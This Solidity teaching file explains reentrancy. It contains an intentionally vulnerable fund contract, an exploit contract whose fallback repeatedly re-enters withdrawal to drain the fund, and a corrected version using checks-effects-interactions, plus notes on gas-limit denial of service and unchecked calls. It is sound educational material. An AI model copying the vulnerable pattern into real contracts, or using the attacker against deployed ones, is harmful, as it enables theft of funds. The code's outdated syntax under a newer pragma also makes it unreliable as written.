pragma solidity >= 0.7.0;

// use checks-effects-interactions pattern when interacting with external parties

// Insecure contract

contract UnsafeFund {
    mapping(address => uint) userBalances;
    function withdrawBalance() public {
        // external call 
        if (msg.sender.call.value(userBalances[msg.sender])())
          userBalances[msg.sender] = 0 ;
    }
}
contract Exploiter {
    UnsafeFund f;
    uint public count;
    event LogWithdrawFallback(uint c, uint balance);

    function Attacker(address vulnerable) public {
        f = UnsafeFund(vulnerable);
    }

    function attack() public {
        f.withdrawBalance(); // execute a refund
    }

    function () public payable {
        count++;
        emit LogWithdrawFallback(count, address(f).balance);
        if (count < 10) {
            f.withdrawBalance();
        }
    }
}


contract SafeFund {
    mapping(address => uint) userBalances;
    function withdrawBalance() public {
        uint amount = userBalances[msg.sender];
        userBalances[msg.sender] = 0;
        msg.sender.transfer(amount); // external calls should be avoided, and they should be last to be exected
        // optimistic accounting because effects are written 
        // down as completed and not before they actually took place
        // because here we are reducing balance then execute transfer, if anything happens during transfer ?
    }

}

/*Notes to secure contracts:
1. DoS with block gas limit: when a number of iteration costs beyond gas limit, a contract is stalled or blocked
when this happens, attackers may attack the contract and manipulate gas

2. avoid external calls, executing them at last in your functions using checks-effects-interaction pattern

3. Handle errors: 
// do
if (!contractAddress.send(100)) {

}
// don't
contractAddress.send(100);
// don't
contractAddress.call.value(55)(); // this is dangerous as it will forward remaining gas and soen't check for result
// 
contractAddress.call.value(50)(bytes4(sha3("withdraw()"))); // if withdraw throws an exception, 
// the raw call() will only return false and transaction will NOT be reverted

*/